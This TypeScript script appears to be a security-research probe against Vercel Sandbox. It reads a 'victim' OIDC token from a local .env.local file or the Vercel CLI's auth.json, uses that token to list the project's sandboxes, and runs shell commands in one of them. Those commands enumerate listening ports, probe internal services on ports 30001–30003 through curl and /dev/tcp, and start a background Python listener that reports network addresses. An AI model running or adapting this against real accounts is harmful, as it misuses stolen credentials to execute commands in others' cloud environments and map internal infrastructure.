import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";

function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local", "utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json", "utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}

const VICTIM = loadToken();
let V: any;
try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const CMD = `
set +e
echo "=== 1. puertos LISTEN en la VM ==="
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
echo ""
echo "=== 2. que procesos escuchan ==="
ss -tlnp 2>/dev/null | grep -E "3000[123]|23456|2666" | awk '{print $4, $6}' | head
echo ""
echo "=== 3. quienes son esos servicios (curl local) ==="
for p in 30001 30002 30003; do
  echo "--- puerto $p ---"
  timeout 3 curl -s --max-time 2 http://127.0.0.1:$p/ 2>&1 | head -3
  timeout 3 bash -c "exec 3<>/dev/tcp/127.0.0.1/$p; echo -n 'GET / HTTP/1.0\\r\\nHost: localhost\\r\\n\\r\\n' >&3; cat <&3" 2>/dev/null | head -5
done
echo ""
echo "=== 4. arrancar echo server (python simple, sin f-string) ==="
cat > /tmp/e2.py << 'PYEOF'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 3000))
s.listen(50)
import os, subprocess
while True:
    c, a = s.accept()
    try:
        data = c.recv(4096).decode("utf-8", "replace")
        peer = a[0] + ":" + str(a[1])
        ips = subprocess.run(["ip","-o","addr"],capture_output=True,text=True).stdout
        body = "peer=%s\\nfirst-line=%s\\nlisten-ips:\\n%s\\n" % (peer, data.split(chr(10))[0] if data else "", ips)
        c.sendall(b"HTTP/1.1 200 OK\\r\\nContent-Length: %d\\r\\nContent-Type: text/plain\\r\\n\\r\\n%s" % (len(body.encode()), body.encode()))
    except Exception as e:
        pass
    c.close()
PYEOF
nohup python3 /tmp/e2.py > /tmp/e2.log 2>&1 &
sleep 1
echo "echo server pid: $(pgrep -f e2.py)"
ss -tln 2>/dev/null | grep 3000
echo "=== 5. test local del echo ==="
timeout 3 curl -s --max-time 2 http://127.0.0.1:3000/ | head -10
echo "=== DONE ==="
`;

import { APIClient } from "/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js";

async function main() {
  const client = new APIClient({ token: VICTIM, teamId, projectId });
  const l: any = await client.listSandboxes({ projectId, limit: 50 });
  const sbxs = l.json?.sandboxes ?? l.json ?? [];
  const target = sbxs.find((s: any) => s.name?.startsWith("ingress-echo-"));
  if (!target) { console.error("no sandbox"); process.exit(1); }
  const s = await Sandbox.get({ name: target.name, token: VICTIM, teamId, projectId });
  const r = await s.runCommand("bash", ["-c", CMD], { wait: true, timeout: 60_000 });
  const out = await r.output("both");
  console.log(out);
  console.log("DOMAIN_3000=" + s.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });